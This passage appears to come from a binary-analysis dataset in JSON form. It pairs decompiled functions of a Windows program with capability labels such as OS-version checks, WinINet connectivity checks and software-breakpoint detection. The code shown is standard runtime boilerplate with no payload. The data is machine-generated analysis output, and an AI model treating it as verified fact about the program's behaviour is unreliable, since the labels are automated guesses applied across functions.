{
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004044e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004044e0(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x7b3008) {\n        return;\n    }\n    *0x7b43d8 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x7b43dc = &arg_8h;\n    *0x7b4318 = 0x10001;\n    *0x7b42c0 = 0xc0000409;\n    *0x7b42c4 = 1;\n    var_328h = *0x7b3008;\n    var_324h = *0x7b300c;\n    *0x7b42cc = unaff_retaddr;\n    *0x7b43a4 = in_GS;\n    *0x7b43a8 = in_FS;\n    *0x7b43ac = in_ES;\n    *0x7b43b0 = in_DS;\n    *0x7b43b4 = unaff_EDI;\n    *0x7b43b8 = unaff_ESI;\n    *0x7b43bc = unaff_EBX;\n    *0x7b43c0 = in_EDX;\n    *0x7b43c4 = in_ECX;\n    *0x7b43c8 = in_EAX;\n    *0x7b43cc = unaff_EBP;\n    *0x7b43d0 = unaff_retaddr;\n    *0x7b43d4 = in_CS;\n    *0x7b43e0 = in_SS;\n    *0x7b4310 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040667c(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x40119c);\n    if (*0x7b4310 == 0) {\n        fcn.0040667c(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 865
    },
    "00405c93": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405c93(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x7b4624, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.00405c4a();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.00405c08(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "00405cfe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nfloat10 fcn.00405cfe(ulong param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_14h;\n    uint32_t in_XMM0_Da;\n    uint uVar4;\n    uint32_t in_XMM0_Db;\n    uint uVar5;\n    uint32_t in_XMM0_Dd;\n    double dVar6;\n    double dVar7;\n    double dVar8;\n    uint64_t in_XMM2_Qa;\n    uint32_t uVar9;\n    double dVar10;\n    double dVar11;\n    uchar auVar12 [16];\n    double dVar13;\n    uint64_t in_XMM7_Qa;\n    double dVar14;\n    uint64_t uVar15;\n    double dVar17;\n    uint64_t uVar18;\n    double dStack12;\n    uint32_t uVar16;\n    \n    dVar8 = CONCAT44(in_XMM0_Db, in_XMM0_Da);\n    auVar12 = pinsrw(ZEXT816(0), 0x2000, 2);\n    uVar1 = in_XMM0_Db >> 0xc & 0x7ffff;\n    if (uVar1 - 0x3fb00 < 0x3bb) {\n        iVar2 = (in_XMM0_Db >> 0xc & 0xfffc) - 0xfb00;\n        auVar12 = CONCAT88(in_XMM2_Qa & in_XMM7_Qa, *0x4029f8 & dVar8) | auVar12;\n        iVar3 = iVar2 * 4;\n        dVar11 = SUB168(auVar12, 0);\n        dVar13 = dVar8 * *(iVar2 * 2 + 0x402130);\n        dVar10 = SQRT(*0x402a00 - dVar8 * dVar8) * dVar11;\n        dVar6 = dVar13 - dVar10;\n        uVar1 = SUB164(auVar12 >> 0x20, 0);\n        uVar9 = uVar1 & 0x80000000;\n        dVar7 = dVar6 * dVar6;\n        return (((*0x4029a8 * dVar7 + *0x4029a0) * dVar6 * dVar7 * dVar7 +\n                (*0x402998 * dVar6 * dVar7 - ((*(iVar3 + 0x401230) ^ uVar9 << 0x20) - *0x402930))) -\n               ((dVar8 + dVar11) * (CONCAT44(in_XMM0_Db, in_XMM0_Da) - dVar11)) / (dVar13 + dVar10)) -\n               ((*(iVar3 + 0x401238) ^ SUB168(CONCAT412(uVar1, ZEXT412(uVar9) << 0x20) >> 0x40, 0)) - *0x402938 &\n               0xffffffff00000000);\n    }\n    if (uVar1 - 0x3febb < 0x41) {\n        dVar13 = (in_XMM0_Db >> 6) << 0x26;\n        dVar11 = *0x402a00 - dVar13 * dVar13;\n        dVar6 = (CONCAT44(in_XMM0_Db, in_XMM0_Da) + dVar13) * (dVar8 - dVar13);\n        dVar10 = SQRT(dVar11 - dVar6);\n        uVar1 = -(SUB121(CONCAT48(in_XMM0_Dd >> 0xc, CONCAT44(in_XMM0_Db, in_XMM0_Da)) >> 0x3f, 0) & 1);\n        dVar7 = *0x4029f8 & dVar10 | SUB168(auVar12, 0) | ~*0x4029f0 & CONCAT44(in_XMM0_Db, in_XMM0_Da);\n        iVar3 = ((dVar10 << 2) >> 0x30) - 0xfec0;\n        dVar10 = dVar10 * *(iVar3 * 8 + 0x402130);\n        dVar13 = (dVar13 * dVar7 - dVar10) + (dVar8 - dVar13) * dVar7;\n        dVar8 = ((dVar11 - dVar7 * dVar7) - dVar6) / (dVar10 + dVar10 + dVar13);\n        iVar3 = iVar3 * 0x10;\n        dVar7 = (SUB168(CONCAT412(uVar1, CONCAT48(uVar1, CONCAT44(uVar1, uVar1))) >> 0x40, 0) & *0x402948) +\n                *(iVar3 + 0x401238);\n        dVar11 = dVar13 * dVar13;\n        auVar12 = pinsrw(0x0, uVar1 & 0x8000, 3);\n        dVar6 = dVar8 + dVar7;\n        return (*0x4029a8 * dVar11 + *0x4029a0) * dVar13 * dVar11 * dVar11 +\n               *0x402998 * dVar13 * dVar11 + (CONCAT44(uVar1, uVar1) & *0x402940) + *(iVar3 + 0x401230) +\n               dVar8 + (dVar7 - dVar6) + dVar6 ^ SUB168(auVar12, 0);\n    }\n    if (uVar1 - 0x3c300 < 0x3800) {\n        dVar6 = CONCAT44(in_XMM0_Db, in_XMM0_Da) * CONCAT44(in_XMM0_Db, in_XMM0_Da);\n        dVar7 = CONCAT44(in_XMM0_Db, in_XMM0_Da) * CONCAT44(in_XMM0_Db, in_XMM0_Da);\n        dVar11 = dVar8 * dVar6;\n        return (*0x402938 - dVar8) +\n               (((*0x402930 - dVar11 * dVar11 * dVar11 * (*0x4029b0 * dVar6 + *0x4029c0 + *0x4029d0 * dVar6 * dVar6)) -\n                CONCAT44(in_XMM0_Db, in_XMM0_Da) * dVar7 * (*0x4029b8 * dVar7 + *0x4029c8 + *0x4029d8 * dVar7 * dVar7))\n               - (dVar8 - (*0x402938 - (*0x402938 - dVar8))));\n    }\n    if (uVar1 - 0x3fefc < 4) {\n        dVar8 = *0x402a08 - (dVar8 & *0x4029f0) * *0x402a08;\n        uVar16 = dVar8 >> 0x20;\n        uVar15 = dVar8 & 0xffffffff;\n        dVar14 = uVar15 | uVar16 << 0x20;\n        dVar6 = SQRT(dVar8);\n        dVar17 = SUB168(CONCAT412(uVar16, CONCAT48(SUB84(dVar8, 0), dVar14)) >> 0x40, 0);\n        dVar13 = uVar15 | uVar16 << 0x20;\n        uVar18 = -(CONCAT44(in_XMM0_Db, in_XMM0_Da) < 0.0);\n        uVar1 = SUB164(ZEXT1216(CONCAT48(in_XMM0_Dd >> 0xc, uVar18)) >> 0x20, 0);\n        dVar8 = *0x402970 & dVar6;\n        uVar9 = dVar6 >> 0x20;\n        dVar7 = dVar6 & 0xffffffff | uVar9 << 0x20;\n        dVar11 = SUB168(CONCAT412(uVar9, CONCAT48(SUB84(dVar6, 0), dVar7)) >> 0x40, 0);\n        dVar10 = SUB168(CONCAT412(uVar9, CONCAT48(SUB84(dVar6, 0), dVar11)) >> 0x40, 0);\n        auVar12 = pinsrw(ZEXT816(0), in_XMM0_Db >> 0x10 & 0x8000, 3);\n        return (uVar1 << 0x20 & *0x402948) +\n               (*0x4029c0 + *0x4029b0 * dVar14 + *0x4029d0 * dVar14 * dVar14) * dVar14 * dVar14 * dVar13 * dVar13 *\n               (dVar11 + dVar11) + ((uVar18 & 0xffffffff | uVar1 << 0x20) & *0x402940) +\n               (*0x4029c8 + *0x4029b8 * dVar17 + *0x4029d8 * dVar17 * dVar17) *\n               SUB168(CONCAT412(uVar16, CONCAT48(uVar15, dVar13)) >> 0x40, 0) * (dVar10 + dVar10) +\n               ((dVar13 - dVar8 * dVar8) - (dVar6 - dVar8) * ((dVar7 + dVar7) - (dVar6 - dVar8))) / dVar11 +\n               dVar11 + dVar11 ^ SUB168(auVar12, 0);\n    }\n    if (uVar1 < 0x3ff00) {\n        return *0x402938 + *0x402930;\n    }\n    if ((0x3ff00000 - (in_XMM0_Db & 0x7fffffff) | in_XMM0_Da) != 0) {\n        if (((param_1 >> 0x20 & 0x7fffffff) + 0x80100000) - (param_1 == 0) < 0) {\n            auVar12 = pinsrw(ZEXT816(0), 0x7ff0, 3);\n            dVar8 = SUB168(auVar12, 0) * 0.0;\n            uVar4 = SUB84(dVar8, 0);\n            uVar5 = dVar8 >> 0x20;\n            arg_14h = 0x3a;\n        }\n        else {\n            dVar8 = CONCAT44(in_XMM0_Db, in_XMM0_Da) + 0.0;\n            uVar4 = SUB84(dVar8, 0);\n            uVar5 = dVar8 >> 0x20;\n            arg_14h = 0x3f0;\n        }\n        dStack12 = CONCAT44(uVar5, uVar4);\n        fcn.004081fa(&param_1, &param_1, &dStack12, arg_14h);\n        return dStack12;\n    }\n    iVar3 = -((in_XMM0_Db >> 0x10) >> 0xf);\n    uVar15 = CONCAT44(iVar3, iVar3);\n    return (*0x402958 & uVar15) + (*0x402950 & uVar15);\n}\n",
        "token_count": 2526
    },
    "0040972a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00409830: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00409835)\n// WARNING: Removing unreachable block (ram,0x00409864)\n// WARNING: Removing unreachable block (ram,0x0040983b)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040972a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004092b0(0x7b2550, 0x20);\n    fcn.00409b0a(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if (*0x7b465c != 1) {\n        *0x7b4658 = 1;\n        *0x7b4654 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x3a57928);\n            *(unaff_EBP + -0x30) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar1)(*0x3a57924);\n                *(unaff_EBP + -0x2c) = piVar3;\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x28) = piVar3;\n                while( true ) {\n                    piVar3 = piVar3 + -1;\n                    *(unaff_EBP + -0x2c) = piVar3;\n                    if (piVar3 < piVar2) break;\n                    iVar4 = fcn.00407c5b();\n                    if (*piVar3 != iVar4) {\n                        if (piVar3 < piVar2) break;\n                        pcVar5 = (*pcVar1)(*piVar3);\n                        iVar4 = fcn.00407c5b();\n                        *piVar3 = iVar4;\n                        (*pcVar5)();\n                        iVar4 = (*pcVar1)(*0x3a57928);\n                        piVar2 = (*pcVar1)(*0x3a57924);\n                        if ((*(unaff_EBP + -0x24) != iVar4) || (*(unaff_EBP + -0x28) != piVar2)) {\n                            *(unaff_EBP + -0x24) = iVar4;\n                            *(unaff_EBP + -0x30) = iVar4;\n                            *(unaff_EBP + -0x28) = piVar2;\n                            *(unaff_EBP + -0x2c) = piVar2;\n                            piVar3 = piVar2;\n                        }\n                        piVar2 = *(unaff_EBP + -0x30);\n                    }\n                }\n            }\n            *(unaff_EBP + -0x1c) = 0x401168;\n            while (*(unaff_EBP + -0x1c) < 0x401174) {\n                if (**(unaff_EBP + -0x1c) != NULL) {\n                    (***(unaff_EBP + -0x1c))();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n            }\n        }\n        *(unaff_EBP + -0x20) = 0x401178;\n        while (*(unaff_EBP + -0x20) < 0x40117c) {\n            if (**(unaff_EBP + -0x20) != NULL) {\n                (***(unaff_EBP + -0x20))();\n            }\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00409a31(8);\n    }\n    return;\n}\n",
        "token_count": 1020
    },
    "0040a75d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040a75d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x7b3008 ^ &stack0xfffffffc;\n    fcn.00404da3(arg_10h);\n    var_14h = fcn.0040cab6(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040c014(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040a7b6:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040a7f6;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040a7e8:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040a7f6;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040a7e8;\n        goto code_r0x0040a7b6;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040a7f6:\n    fcn.004044e0(unaff_EBX);\n    return;\n}\n",
        "token_count": 519
    },
    "0040a805": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040a805(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x7b3008 ^ &stack0xfffffffc;\n    fcn.00404da3(arg_10h);\n    var_14h = fcn.0040cab6(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040c565(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040a85e:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040a89e;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040a890:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040a89e;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040a890;\n        goto code_r0x0040a85e;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040a89e:\n    fcn.004044e0(unaff_EBX);\n    return;\n}\n",
        "token_count": 509
    },
    "0040bba7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040bba7(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00409a31(0);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "0040c014": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0040c014(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x7b3008 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = *0x7b3ec0;\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = *0x7b3ebc + -1;\n        iVar14 = *0x7b3ebc + (*0x7b3ebc >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (*0x7b3ebc & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x0040c158;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x0040c15f;\ncode_r0x0040c158:\n                        do {\n                            bVar6 = true;\ncode_r0x0040c15f:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x0040c16d;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x0040c16d:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x7b3eb8 - *0x7b3ebc) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x7b3eb8 < iVar14) {\n                if (iVar14 < *0x7b3eb4) {\n                    iVar14 = iVar14 + *0x7b3ec8;\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = *0x7b3ec0 + (*0x7b3ec0 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = *0x7b3ec0 + (*0x7b3ec0 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = *0x7b3ec8 + *0x7b3eb4;\n                }\n                goto code_r0x0040c518;\n            }\n            iVar13 = *0x7b3eb8 - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = *0x7b3ebc + -1;\n            iVar13 = *0x7b3ebc + (*0x7b3ebc >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (*0x7b3ebc & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x0040c30c;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x0040c30c:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = *0x7b3ec0 + 1 + (*0x7b3ec0 + 1 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x0040c518:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (*0x7b3ec4 == 0x40) {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (*0x7b3ec4 == 0x20) {\n        *arg_ch = uVar15;\n    }\n    fcn.004044e0(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3287
    },
    "0040c565": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
